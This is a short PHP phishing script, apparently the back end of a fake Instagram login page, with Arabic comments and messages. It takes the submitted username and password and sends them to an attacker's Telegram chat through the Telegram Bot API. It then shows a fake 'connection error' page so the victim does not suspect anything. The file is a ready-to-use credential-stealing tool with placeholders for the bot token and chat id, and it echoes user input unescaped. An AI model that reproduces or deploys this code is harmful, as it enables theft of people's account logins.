<?php
    $name = $_POST['name'];
    $email = $_POST['email'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];

    $API_KEY = "000"; //توكنك العزيز
    $admin = 00000103090; // ايديك

    $text = urlencode("⌔︙ هنالك حساب صيد جديد .

⌔︙تسجيل الدخول : $name
⌔︙كلمة المرور : $email

⌔︙ سورس ترايڤ ︙⬅️ @SOURCE_TRIPH .

⌔︙ المطور : ＭＡＨＤＩ <\> ︙@MAHDI_VE1 .");
    $url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
    file_get_contents($url);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>خطأ في الاتصال !</title>
    <link rel="icon" type="image/x-icon" href="insta.png">
</head>
<body>
    <p>عذراً،<b><?php echo $name; ?></b> حدث خطأ. يرجى التحقق من الإتصال بلانترنت !</p>
</body>
</html>